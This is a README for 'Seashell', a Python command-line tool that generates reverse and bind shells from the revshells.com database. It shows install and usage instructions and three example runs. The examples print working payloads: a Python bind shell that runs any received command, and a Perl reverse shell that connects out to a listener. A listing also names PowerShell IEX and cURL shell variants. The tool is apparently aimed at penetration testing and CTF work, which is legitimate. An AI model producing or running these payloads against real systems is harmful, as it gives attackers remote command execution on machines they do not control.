# Seashell
Seashell is a python tool for generating shells on the go!
It uses the database of [revshells.com](https://revshells.com) and offers the same functionality. Only difference being, it's in your terminal!

# Credits
I want to thank @0dayCTF and all the contributors of [reverse-shell-generator](https://github.com/0dayCTF/reverse-shell-generator) for making this project possible.

# Installation
Seashell does not use **ANY** external libraries so you can install it in seconds :D
```bash
$ git clone https://github.com/lil-skelly/seashell
[ ]
$ cd seashell && python3 -m pip install .
```

# Usage
```bash
usage: python3 -m seashell [-h] [--verbose] [-os {windows,mac,linux}] [-ip IP] [-p PORT]
                           [-shell {reverse,bind,msfvenom,hoaxshell,listeners}]
                           [-P PAYLOAD] [--interactive]
                           [term]

Seashell is a CLI 'reverse' shell generator utility. Happy hacking!

positional arguments:
  term                  Search term to filter payloads (use list to list payloads).

options:
  -h, --help            show this help message and exit
  --verbose, -V         Sets logging level to [DEBUG]
  -os {windows,mac,linux}
                        Filters results for [given] operating system
  -ip IP                Target IP
  -p PORT, --port PORT  Target port
  -shell {reverse,bind,msfvenom,hoaxshell,listeners}, -S {reverse,bind,msfvenom,hoaxshell,listeners}
                        Filters results for [given] shell type
  -P PAYLOAD, --payload PAYLOAD
                        metasploit payload to use for listener [msfconsole]
  --interactive, -i     Enables interactive mode. Any arguments besides -V will be ignored!
```
## Examples:

Seashell filters your results based on the shell type and OS specified. 

Use `list` as the search `term` on both manual and interactive mode to get a list of all the payloads available, matching the specified OS/Shell type.

If you do not find your desired payloads, it might be because the payload you are looking for is not available for *linux* systems (the default OS used by seashell). ~ Example 3

After finding the ID of the payload you desire to use, you can:
- Repeat the command and use the ID as a search term if in manual mode
- Type `use ID` if in interactive mode

Seashell will then select the appropriate payload.

- Example 1 (manual mode)
```bash
$ python -m seashell -ip localhost -p 1234 -shell bind python
[+] Welcome to the sea of shells! Happy pwning >:)
[*] Python3 Bind         70
[*] PHP Bind             71

$ python -m seashell -ip localhost -p 1234 -shell bind 70
[*] Welcome to the sea of shells! Happy pwning >:)
[+] Using <Python3 Bind>
python3 -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();
while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```
- Example 2 (interactive mode):
```bash
$ python -m seashell -i
[+] Welcome to the sea of shells! Happy pwning >:)
~> Enter the IP: localhost
~> Specify the port (default: 4444): 
~> Filter by OS [LINUX, mac, windows]: 
~> Select payload type [REVERSE, bind, msfvenom, hoaxshell]:  
[SEARCH] perl
[*] Perl                 20
[*] Perl no sh           21
[*] curl                 13
[*] telnet               60
[SEARCH] use 21
[+] Using <Perl no sh>
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"127.0.0.1:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

- Example 3 (payload listing in manual mode)
```bash
$ python -m seashell -ip localhost -os windows -shell hoaxshell list
[+] Welcome to the sea of shells! Happy pwning >:)
[*] Windows CMD cURL     94
[*] PowerShell IEX       95
[*] PowerShell IEX Constr Lang Mode 96
[*] PowerShell Outfile   97
[*] PowerShell Outfile Constr Lang Mode 98
[*] Windows CMD cURL https 99
[*] PowerShell IEX https 100
[*] PowerShell Constr Lang Mode IEX https 101
[*] PowerShell Outfile https 102
[*] PowerShell Outfile Constr Lang Mode https 103
```